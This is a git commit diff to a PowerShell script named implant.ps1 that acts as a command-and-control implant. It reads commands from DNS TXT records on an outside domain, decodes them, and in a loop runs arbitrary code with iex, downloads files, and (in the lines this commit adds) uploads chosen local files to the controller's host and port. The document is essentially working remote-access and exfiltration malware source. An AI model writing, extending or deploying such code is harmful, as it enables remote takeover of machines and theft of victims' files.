c705f67060f53dfd415a57af6e1506fbf60ba0a4
TomSomerville <thomas.somerv@gmail.com>
2019-07-23 17:00:36 -0400

    Update implant.ps1

--- implant.ps1
+++ implant.ps1
@@ -1,24 +1,8 @@
-$query = Resolve-DnsName -Type TXT -Name down.thomassomerville.com
+$query = Resolve-DnsName -Type TXT -Name post.thomassomerville.com
 $results = $query.strings -split ","
 $address = $results[0]
 $port = $results[1]
 $cmd = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($results[2]))
-
-
-if ($cmd.StartsWith("EXEC=")){
-    $exec = iex($cmd.substring(5))
-}
-if ($cmd.StartsWith("RUN=")){
-    iex($cmd.substring(4))
-}
-if ($cmd.StartsWith("DOWN=")){
-    $downCMD = $cmd.substring(5) -split ","
-    Invoke-WebRequest -Uri $downCMD[0] -OutFile $downCMD[1]    
-}
-if ($cmd.StartsWith("PUT=")){
-    $putCMD = $cmd.substring(4) -split ","
-
-}
 
 While ($True){
     if ($cmd.StartsWith("EXEC=")){
@@ -33,7 +17,9 @@ While ($True){
     }
     if ($cmd.StartsWith("PUT=")){
         $putCMD = $cmd.substring(4) -split ","
-
+        $url = "http://"+$address+":"+$port
+        $wc = New-Object System.Net.WebClient
+        $wc.UploadFile($url,$putCMD[0])
     }
-    Start-Sleep -s 5
+    Start-Sleep -s 100
 }
